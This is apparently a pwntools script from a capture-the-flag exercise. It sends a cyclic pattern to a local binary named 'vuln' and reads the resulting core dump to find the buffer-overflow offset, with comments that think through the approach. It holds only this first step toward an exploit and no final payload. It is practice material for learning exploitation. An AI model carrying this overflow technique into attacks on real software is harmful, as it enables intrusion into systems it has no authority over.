from pwn import *

# Context
context.binary = './vuln'
context.log_level = 'error'

# Create process
p = process('./vuln')

# Send cyclic pattern
payload = cyclic(100)
p.recvuntil(b'Give me a string that gets you the flag\n')
p.sendline(payload)
p.wait()

# Get core dump (might need to enable core dumps in system, but pwntools process usually handles segfaults gracefully if we check return code or just read output?)
# Actually, better to use gdb or cyclic_find with the crash address.
# Let's run it and see if it crashes and prints something, or I can inspect core file if generated.

# Better approach with pwntools:
core = p.corefile
print(f"Fault address: {hex(core.fault_addr)}")
offset = cyclic_find(core.fault_addr)
print(f"Offset: {offset}")
